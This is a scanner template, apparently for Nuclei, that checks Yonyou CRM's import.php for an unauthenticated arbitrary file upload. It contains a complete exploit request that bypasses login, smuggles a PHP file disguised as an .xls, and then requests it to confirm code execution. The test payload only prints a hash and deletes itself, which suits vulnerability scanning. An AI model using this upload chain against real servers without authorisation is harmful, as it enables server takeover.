id: yongyou-u8-crm-import-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 用友CRM客户关系管理系统import.php存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传webshell文件，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BCRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fimport.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
  
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
        Content-Length: 271
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
        Upgrade-Insecure-Requests: 1

        ------WebKitFormBoundarye0z8QbHs79gL8vW5
        Content-Disposition: form-data; name="xfile"; filename="11.xls"

        <?php echo(md5(1)); unlink(__FILE__); ?>
        ------WebKitFormBoundarye0z8QbHs79gL8vW5
        Content-Disposition: form-data; name="combo"

        {{filename}}.php
        ------WebKitFormBoundarye0z8QbHs79gL8vW5--
      - |-
        GET /tmpfile/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 23
    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
